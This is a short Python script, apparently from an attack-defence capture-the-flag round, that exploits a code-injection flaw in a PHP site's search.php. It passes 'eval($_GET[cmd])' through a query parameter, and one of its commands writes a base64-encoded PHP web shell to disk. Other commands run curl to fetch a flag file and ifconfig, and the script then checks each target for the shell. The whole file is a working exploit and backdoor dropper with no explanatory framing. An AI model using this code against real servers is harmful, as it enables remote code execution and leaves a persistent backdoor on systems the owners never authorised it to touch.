__author__ = 'tom'
# -*- coding:utf-8 -*-
import requests
import re
import sys
import threading

iplist = ["192.168.49.148"]
port = "8033"
errList = []

shellName = "seaup3.php"
order = "file_put_contents(dirname($_SERVER['SCRIPT_FILENAME']).'/"+shellName+"',base64_decode('dnZ2PD9waHAgZXZhbCgkX1BPU1Rbenp6XSk7Pz4='));"
order="curl http://192.168.0.112/flag.txt"
order="ifconfig"
targetPath = "/search.php?searchtype=5&tid=&area=eval($_GET[cmd])&cmd="+order


def upFile(ipPort) :
    url = ipPort + targetPath
    try :
        """upload shell """
        req = requests.get(url)
        """access shell"""
        shellUrl = ipPort +"/" + shellName
        #print shellUrl
        reqShell = requests.get(shellUrl)
        print reqShell.content
        if 200 == reqShell.status_code :
            print shellUrl + "   OK!"
        else :
            print shellUrl + "   Failed"
    except :
        err = url + "---**error!"

for ip in iplist :
    ipPort = "http://" + ip + ":" + port
    thd = threading.Thread(target=upFile, args=(ipPort,))
    thd.start()




